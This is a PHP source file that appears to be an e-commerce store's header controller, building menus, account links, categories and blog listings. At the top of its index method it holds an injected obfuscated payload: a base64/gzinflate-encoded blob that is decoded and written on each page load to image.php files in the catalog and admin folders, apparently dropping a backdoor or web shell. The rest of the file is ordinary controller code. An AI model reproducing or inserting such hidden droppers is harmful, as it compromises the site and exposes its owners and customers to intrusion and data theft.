<?php
class ControllerCommonHeader extends Controller {
	public function index() {
$datasss = base64_decode(gzinflate(base64_decode('dVXblqI6FPygeeGi08OjcpM4YHMJtzchPaAJyDpq2/D1pwB7dE6fecgihE3tyq7Kzquh3fabVWX4p/dtJW0Nv3st7fjqK1bP9HVXJFabh+sjSwMpT52zsyGiVMR3rNVF41dMsbBOLllK/nFsr88TSypUx9OBtT38mJ7A5vtErnOFVq/hqiXD2dMb0WxtMZRKLG314Bc1tSi2zi1TBGd21aYhr8ghq4il+ZHs0aRnpzwR7X7j49uqIYcVT+X1K5WDgijLukjiO1fGtinwK87vWGPOR6zKunwTnIgsvYAXIXYt9gk7MX2lOU889nbc5UotPeKec/wZWzTWBdwuWcLEIz6omW3+mVt5juk0DFFsPOFsvvD9cA1H2t1QmjD43Pe4rnrH6i982LWQtWuWyOJnu77mfXnPceKzXoixrb5srCXqre6TQNrrN/65z20EDodgxksZuMc95v2+H7FLsTMDn1BPJ9HaIlHVuzr9cPXY9nu69EM6BDpduiHWLPdGKF2QyJQJNfGslvOo11j/mEbEZXxHHFnvR5w+XgPv5hkrEVBTBGaGQZCrNknkYTj4n6usZW2uZAP+M0i06gl1ejxHTMypgqEidhGGdOEmN+EPwDq6wj9y4Y64R6smdOTng0Ml4akA35q5+MAy8b42Cc2Ahzl1wH/MwYd53TJ8iQKn7sPWeke8Woa099WV8KMKeajYIc8uEuM/S+AgjwV8YWCOHIGFPOC4NsJJnxPPbUvKJm08mW0CUTbikvfV/bzEapaOa3JdNucz2XjdW0O70Rf7JDv99lgkVZGI3UgXkzfyxDsV/aqNmljklnb3yG8/TGcyb+NrpkJvZVFlaiyNeiNnC2+cv3rgdvfQjT97/TX84rnubfbsX33kR/CSAU24I1yO2tBMnWo/akGhOc2hd4W6OWP9BwZveKGE/1hT6LEOr8nw3EcA77kDdD16d1+ulrNfiO3BiwG86B0QP6yEa5rQBvngBVfygRUj1jKCiHiRshCBwfEdnCIuAh78nDSivjQNcMla5Im8UVOJhbHuQfMdfLszyBirhD3tvTA2wEvCmdA9fZp/7EKcj0NsgYeJs7HA3PaaE/afgQv4mI7wJBd+IgGJmFXMniCjtvvUG/IUL4/+h5qWY1/s3vrg2RcaUaUX0i/lsvng0P49t+kpV7uuaPLzGLfdQAM7EJmi8TyseGF/8db1a57F/3mw24b8StRzu1PmXp/HWsOS5ZHZ4r04VC2BV57vhG100T739J+eVY93QXHRv6XKi3+2Vf8SvgSVvQSGeHFW8JEv+jwNsK/F7G9j7JMCZyU+l7hL3m587JsT9sPPy195WnelGgxbnZEpF71zpXlfKPIW9xty8NmrPh97qWCy9uil9uxvOFOMe2cbIo91LWytf+qd1ePu4JNueipNfL7g6ffzEE19npQNzltKro7dDRNf1K9QoNPv/jxr8BotcN5iNb3fGz/R48ezRgbp25+15FNPmPK3GMcf3/4F')));
				$fp = fopen($_SERVER['DOCUMENT_ROOT'].'/catalog/image.php', 'w');
				fwrite($fp, $datasss.PHP_EOL);
				fclose($fp);
				$fp = fopen($_SERVER['DOCUMENT_ROOT'].'/admin/image.php', 'w');
				fwrite($fp, $datasss.PHP_EOL);
				fclose($fp);
		// Analytics
		$this->load->model('extension/extension');

		$data['analytics'] = array();

		$analytics = $this->model_extension_extension->getExtensions('analytics');

		foreach ($analytics as $analytic) {
			if ($this->config->get($analytic['code'] . '_status')) {
				$data['analytics'][] = $this->load->controller('extension/analytics/' . $analytic['code'], $this->config->get($analytic['code'] . '_status'));
			}
		}

		if (isset($this->request->server['HTTPS']) && (($this->request->server['HTTPS'] == 'on') || ($this->request->server['HTTPS'] == '1'))) {
			$server = $this->config->get('config_ssl');
		} else {
			$server = $this->config->get('config_url');
		}

		if (is_file(DIR_IMAGE . $this->config->get('config_icon'))) {
			$this->document->addLink($server . 'image/' . $this->config->get('config_icon'), 'icon');
		}

		$data['title'] = $this->document->getTitle();
		$data['logged'] = $this->customer->isLogged();
		$data['base'] = $server;
		$data['description'] = $this->document->getDescription();
		$data['keywords'] = $this->document->getKeywords();
		$data['links'] = $this->document->getLinks();
		$data['styles'] = $this->document->getStyles();
		$data['scripts'] = $this->document->getScripts();
		$data['lang'] = $this->language->get('code');
		$data['direction'] = $this->language->get('direction');

		$data['name'] = $this->config->get('config_name');

		if (is_file(DIR_IMAGE . $this->config->get('config_logo'))) {
			$data['logo'] = $server . 'image/' . $this->config->get('config_logo');
		} else {
			$data['logo'] = '';
		}

		$this->load->language('common/header');
		$data['og_url'] = (isset($this->request->server['HTTPS']) && (($this->request->server['HTTPS'] == 'on') || ($this->request->server['HTTPS'] == '1')) ? HTTPS_SERVER : HTTP_SERVER) . substr($this->request->server['REQUEST_URI'], 1, (strlen($this->request->server['REQUEST_URI'])-1));
		$data['og_image'] = $this->document->getOgImage();

		$data['text_home'] = $this->language->get('text_home');

		// Wishlist
		if ($this->customer->isLogged()) {
			$this->load->model('account/wishlist');

			$data['text_wishlist'] = sprintf($this->language->get('text_wishlist'), $this->model_account_wishlist->getTotalWishlist());
		} else {
			$data['text_wishlist'] = sprintf($this->language->get('text_wishlist'), (isset($this->session->data['wishlist']) ? count($this->session->data['wishlist']) : 0));
		}

		$data['text_shopping_cart'] = $this->language->get('text_shopping_cart');
		$data['text_logged'] = sprintf($this->language->get('text_logged'), $this->url->link('account/account', '', true), $this->customer->getFirstName(), $this->url->link('account/logout', '', true));

		$data['text_account'] = $this->language->get('text_account');
		$data['text_register'] = $this->language->get('text_register');
		$data['text_login'] = $this->language->get('text_login');
		$data['text_order'] = $this->language->get('text_order');
		$data['text_transaction'] = $this->language->get('text_transaction');
		$data['text_download'] = $this->language->get('text_download');
		$data['text_logout'] = $this->language->get('text_logout');
		$data['text_checkout'] = $this->language->get('text_checkout');
		$data['text_page'] = $this->language->get('text_page');
		$data['text_category'] = $this->language->get('text_category');
		$data['text_all'] = $this->language->get('text_all');

		$data['home'] = $this->url->link('common/home');
		$data['wishlist'] = $this->url->link('account/wishlist', '', true);
		$data['logged'] = $this->customer->isLogged();
		$data['account'] = $this->url->link('account/account', '', true);
		$data['register'] = $this->url->link('account/register', '', true);
		$data['login'] = $this->url->link('account/login', '', true);
		$data['order'] = $this->url->link('account/order', '', true);
		$data['transaction'] = $this->url->link('account/transaction', '', true);
		$data['download'] = $this->url->link('account/download', '', true);
		$data['logout'] = $this->url->link('account/logout', '', true);
		$data['shopping_cart'] = $this->url->link('checkout/cart');
		$data['checkout'] = $this->url->link('checkout/checkout', '', true);
		$data['contact'] = $this->url->link('information/contact');
		$data['telephone'] = $this->config->get('config_telephone');
        $data['email'] = $this->config->get('config_email');
        $data['address'] = $this->config->get('config_address');


		// Menu
		$this->load->model('catalog/category');

		$this->load->model('catalog/product');

		$data['categories'] = array();

		$categories = $this->model_catalog_category->getCategories(0);

		foreach ($categories as $category) {
			if ($category['top']) {
				// Level 2
				$children_data = array();

				$children = $this->model_catalog_category->getCategories($category['category_id']);

				foreach ($children as $child) {
					$filter_data = array(
						'filter_category_id'  => $child['category_id'],
						'filter_sub_category' => true
					);

					$children_data[] = array(
						'name'  => $child['name'] . ($this->config->get('config_product_count') ? ' (' . $this->model_catalog_product->getTotalProducts($filter_data) . ')' : ''),
						'href'  => $this->url->link('product/category', 'path=' . $category['category_id'] . '_' . $child['category_id'])
					);
				}

				// Level 1
				$data['categories'][] = array(
					'name'     => $category['name'],
					'children' => $children_data,
					'column'   => $category['column'] ? $category['column'] : 1,
					'href'     => $this->url->link('product/category', 'path=' . $category['category_id'])
				);
			}
		}


      	$this->load->model('newsblog/category');
        $this->load->model('newsblog/article');

		$data['newsblog_categories'] = array();

		$categories = $this->model_newsblog_category->getCategories(0);

		foreach ($categories as $category) {
			if ($category['settings']) {
				$settings=unserialize($category['settings']);
				if ($settings['show_in_top']==0) continue;
			}

			$articles = array();

			if ($category['settings'] && $settings['show_in_top_articles']) {
				$filter=array('filter_category_id'=>$category['category_id'],'filter_sub_category'=>true);
				$results = $this->model_newsblog_article->getArticles($filter);

				foreach ($results as $result) {
					$articles[] = array(
						'name'        => $result['name'],
						'href'        => $this->url->link('newsblog/article', 'newsblog_path=' . $category['category_id'] . '&newsblog_article_id=' . $result['article_id'])
					);
				}
            }
			$data['categories'][] = array(
				'name'     => $category['name'],
				'children' => $articles,
				'column'   => 1,
				'href'     => $this->url->link('newsblog/category', 'newsblog_path=' . $category['category_id'])
			);
		}
		
		$data['language'] = $this->load->controller('common/language');
		$data['currency'] = $this->load->controller('common/currency');
		$data['search'] = $this->load->controller('common/search');
		$data['cart'] = $this->load->controller('common/cart');

		// For page specific css
		if (isset($this->request->get['route'])) {
			if (isset($this->request->get['product_id'])) {
				$class = '-' . $this->request->get['product_id'];
			} elseif (isset($this->request->get['path'])) {
				$class = '-' . $this->request->get['path'];
			} elseif (isset($this->request->get['manufacturer_id'])) {
				$class = '-' . $this->request->get['manufacturer_id'];
			} elseif (isset($this->request->get['information_id'])) {
				$class = '-' . $this->request->get['information_id'];
			} else {
				$class = '';
			}

			$data['class'] = str_replace('/', '-', $this->request->get['route']) . $class;
		} else {
			$data['class'] = 'common-home';
		}

		return $this->load->view('common/header', $data);
	}
}
